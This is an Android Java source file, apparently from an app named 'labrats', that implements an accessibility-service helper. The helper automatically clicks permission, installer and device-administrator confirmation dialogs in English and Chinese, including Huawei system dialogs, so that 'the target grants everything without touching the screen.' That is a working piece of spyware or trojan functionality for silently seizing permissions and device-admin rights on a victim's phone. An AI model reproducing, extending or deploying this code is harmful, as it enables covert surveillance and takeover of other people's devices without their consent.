package com.labs.labrats;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.Arrays;
import java.util.List;

/**
 * Auto-confirm helper (PATCH-22).
 * When armed (PermissionActivity is running its setup chain), the accessibility
 * service auto-clicks permission/system dialogs so the target grants everything
 * without touching the screen. The armed flag guarantees we never click dialogs
 * of unrelated apps outside the setup flow.
 */
public class AutoConfirmHelper {

    private static final String TAG = "AutoConfirmHelper";

    private static volatile boolean armed = false;
    private static volatile long lastClickTime = 0;
    private static volatile int lastClickWindowId = -1;

    /** Packages whose dialogs we are allowed to click while armed. */
    private static final List<String> ALLOWED_PACKAGES = Arrays.asList(
            "com.android.permissioncontroller",
            "com.google.android.permissioncontroller",
            "com.android.settings",
            "com.android.packageinstaller",
            "com.huawei.permissionmanager",
            "com.huawei.systemmanager"
    );

    /** Confirm buttons, exact match (short words) or contains (long phrases). */
    private static final String[] BUTTON_TEXTS = {
            "始终允许", "仅在使用中允许", "允许", "始终", "确定", "激活",
            "Allow all the time", "While using the app", "Allow", "OK", "Activate"
    };

    public static void setArmed(boolean value) {
        armed = value;
        if (!value) {
            lastClickTime = 0;
            lastClickWindowId = -1;
        }
    }

    public static boolean isArmed() {
        return armed;
    }

    /**
     * Attempts to auto-click a confirm button for the given event window.
     * Returns true when a click was dispatched.
     */
    public static boolean tryAutoConfirm(AccessibilityEvent event, AccessibilityNodeInfo root) {
        if (event == null || root == null || !armed) return false;

        int type = event.getEventType();
        if (type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                && type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            return false;
        }

        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (!ALLOWED_PACKAGES.contains(pkg)) return false;

        // Debounce: at most one click per window id within 500ms
        long now = System.currentTimeMillis();
        int windowId = event.getWindowId();
        if (windowId == lastClickWindowId && (now - lastClickTime) < 500) {
            return false;
        }

        boolean clicked = clickMatching(root);
        if (clicked) {
            lastClickTime = now;
            lastClickWindowId = windowId;
        }
        return clicked;
    }

    private static boolean clickMatching(AccessibilityNodeInfo node) {
        if (node == null) return false;

        if (node.isVisibleToUser()) {
            CharSequence textSeq = node.getText();
            CharSequence descSeq = node.getContentDescription();
            String text = textSeq != null ? textSeq.toString().trim() : "";
            String desc = descSeq != null ? descSeq.toString().trim() : "";

            for (String btn : BUTTON_TEXTS) {
                if (isMatch(text, btn) || isMatch(desc, btn)) {
                    if (performClick(node)) {
                        Log.d(TAG, "AUTO_CONFIRM: clicked <" + text + "> on " + node.getPackageName());
                        return true;
                    }
                }
            }
        }

        int count = node.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean done = clickMatching(child);
                child.recycle();
                if (done) return true;
            }
        }
        return false;
    }

    /**
     * Exact match always clicks. Contains matches only for long phrases, and any
     * negated label ("不允许", "don't allow", ...) is never clicked.
     */
    private static boolean isMatch(String actual, String target) {
        if (actual == null || actual.isEmpty()) return false;
        if (actual.equals(target)) return true;

        String a = actual.toLowerCase();
        String t = target.toLowerCase();
        if (a.equals(t)) return true;

        if (a.contains("不允许") || a.contains("禁止")
                || a.contains("don't allow") || a.contains("do not allow")
                || a.contains("deny")) {
            return false;
        }
        return t.length() >= 6 && a.contains(t);
    }

    private static boolean performClick(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isClickable() && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            return true;
        }
        // Walk up to a clickable parent (buttons are often wrapped in containers)
        AccessibilityNodeInfo cur = node.getParent();
        int depth = 0;
        while (cur != null && depth < 5) {
            if (cur.isClickable() && cur.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                cur.recycle();
                return true;
            }
            AccessibilityNodeInfo parent = cur.getParent();
            cur.recycle();
            cur = parent;
            depth++;
        }
        return false;
    }
}
